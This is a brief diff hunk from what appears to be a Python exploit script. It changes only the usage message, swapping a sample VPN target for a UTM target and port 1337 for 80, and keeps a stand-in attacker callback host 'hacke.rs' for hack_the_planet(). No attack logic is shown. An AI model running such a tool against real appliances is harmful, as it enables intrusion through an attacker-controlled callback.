@@ -47,7 +47,7 @@ def hack_the_planet(target, cb_host, cb_port):
     
 def main(args):
     if len(args) != 4:
-        sys.exit("use: %s https://some-vpn.lol:8090 hacke.rs 1337" %(args[0]))
+        sys.exit("use: %s https://some-utm.lol:4443 hacke.rs 80" %(args[0]))
     hack_the_planet(target=args[1], cb_host=args[2], cb_port=args[3])
 
 if __name__ == "__main__":
